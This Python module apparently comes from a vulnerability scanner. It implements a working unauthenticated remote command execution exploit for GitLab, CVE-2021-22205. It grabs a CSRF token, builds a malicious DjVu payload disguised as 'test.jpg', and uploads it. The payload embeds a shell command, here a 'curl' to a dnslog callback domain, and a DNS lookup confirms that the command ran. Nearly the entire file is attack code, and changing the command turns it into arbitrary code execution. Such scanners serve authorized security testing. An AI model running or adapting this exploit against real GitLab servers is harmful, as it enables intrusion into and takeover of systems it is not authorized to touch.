#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep
import re

def cve_2021_22205_scan(self, url):
    ''' 在 GitLab CE/EE中发现了一个从11.9版本开始的问题, 
        GitLab未正确验证传递给文件解析器的图像文件, 从而导致未经身份验证的远程命令执行
    '''
    sessid = '597d45eba94e6e1651ae4fe7bf3b062e'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2021-22205'
    vul_info['vul_method'] = 'GET/POST'
    vul_info['headers'] = {}

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in range(len(self.cve_2021_22205_payloads)):
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
        dns_command = 'curl ' + dns_domain

        path = self.cve_2021_22205_payloads[payload]['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            if (payload in [0, 2]):
                res1 = self.session.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res1.status_code, res1)                        # * LOG

                csrf_token_re = re.search(r'name="csrf-token" content=".*"', res1.text, re.I|re.M|re.U)

                if csrf_token_re:
                    csrf_token = csrf_token_re.group(0)
                    csrf_token = csrf_token.rstrip('"').replace('name="csrf-token" content="', '')
                    headers.update({'X-CSRF-Token': csrf_token})
                    del headers['Content-Type']

                    path = self.cve_2021_22205_payloads[payload+1]['path']
                    target = url + path

                    data = b'\x41\x54\x26\x54\x46\x4f\x52\x4d' + \
                    (len(dns_command) + 0x55).to_bytes(length=4, byteorder='big', signed=True) + \
                    b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61' + \
                    (len(dns_command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True) + \
                    b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b' + \
                    dns_command.encode() + \
                    b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'

                    files = [('file', ('test.jpg', data, 'image/jpeg'))]

                    res2 = self.session.post(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,
                        files=files, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
                    
                    
                    sleep(3)
                    if (md in dns.result(md, sessid)):
                        results = {
                            'Target': target,
                            'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                            'Exp': 'https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/poc.py',
                            'Request-1(csrf-token)': res1,
                            'Request-2': res2
                        }
                        return results
                else:
                    continue
            else:
                continue

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
